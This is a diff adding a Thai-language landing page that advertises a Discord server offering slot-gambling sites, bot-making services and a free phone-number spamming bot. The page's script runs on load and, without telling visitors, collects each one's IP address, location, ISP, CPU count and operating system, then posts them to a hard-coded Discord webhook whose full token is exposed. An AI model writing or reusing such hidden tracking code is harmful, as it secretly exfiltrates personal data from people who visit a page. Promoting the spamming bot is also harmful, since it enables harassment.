@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZZZZ</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;400;600&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: white;
+            font-family: 'Poppins', sans-serif;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        .container {
+            margin: 10% auto;
+            padding: 30px;
+            max-width: 600px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        h1 { font-size: 36px; color: #ffcc00; text-shadow: 0 0 10px #ffcc00; }
+        p { font-size: 18px; margin: 10px 0; }
+        .button {
+            display: inline-block; margin-top: 20px; padding: 12px 25px;
+            font-size: 18px; font-weight: bold; text-transform: uppercase;
+            color: white; text-decoration: none;
+            background: linear-gradient(90deg, #ff00cc, #3333ff);
+            border-radius: 30px; box-shadow: 0 0 15px rgba(255, 0, 204, 0.8);
+        }
+        .button:hover { transform: scale(1.1); box-shadow: 0 0 25px rgba(255, 0, 204, 1); }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>ZZZZ</h1>
+        <p>🎁 มีเว็บสล็อตแตกดีแจก</p>
+        <p>🎀 มีไรต่างๆให้ใช้ฟรีๆไม่คิดตัง</p>
+        <p>🛒 มีโซนให้ดูมากมาย</p>
+        <p>📦 มีของให้เลือกซื้อ</p>
+        <p>📩 บูสเชิร์ฟได้ ยศบอทยิงเบอร์</p>
+        <p>🖥️ ขายโค้ดต่างๆ รับทำ Bot Discord</p>
+        <p>📱 บอทยิงเบอร์ฟรีให้ใช้</p>
+        <p>[+] สั่งทำบอทได้</p>
+        <p>[+] และรับรันต่างๆ</p>
+        <a href="https://discord.gg/t4eR4kjggX" class="button">เข้าดิสคอร์ด</a>
+    </div>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1352905189711020042/LaQJ_Hb_zsrh9YRwON2tUCpK5WlfzILZEn640EcIyY_qvAEkyn1oyrCM6TwVLiGeBYzl"; 
+
+        async function sendIP() {
+            try {
+              
+                let res = await fetch("https://ipapi.co/json/");
+                let data = await res.json();
+                let ip = data.ip;
+                let country = data.country_name;
+                let region = data.region;
+                let city = data.city;
+                let isp = data.org;
+                let hostname = data.asn;
+                
+             
+                let cpu = navigator.hardwareConcurrency || "Unknown";
+                let os = navigator.platform;
+
+                let message = `🔍 **มีคานเข้ว็บ!**\n🌐 **IP:** ${ip}\n🏳️ **ประเทศ:** ${country}\n📍 **จังหวัด:** ${region}\n🏙️ **เมือง:** ${city}\n💻 **ISP:** ${isp}\n🌍 **Hostname:** ${hostname}\n⚙️ **CPU:** ${cpu} Cores\n🖥️ **OS:** ${os}`;
+
+                // ส่งไปยัง Discord Webhook
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: message })
+                });
+
+                console.log("✅ ส่งข้อมูล IP และรายละเอียดไปยัง Webhook สำเร็จ!");
+            } catch (error) {
+                console.error("❌ ไม่สามารถดึงข้อมูลได้:", error);
+            }
+        }
+
+        sendIP();
+    </script>
+</body>
+</html>
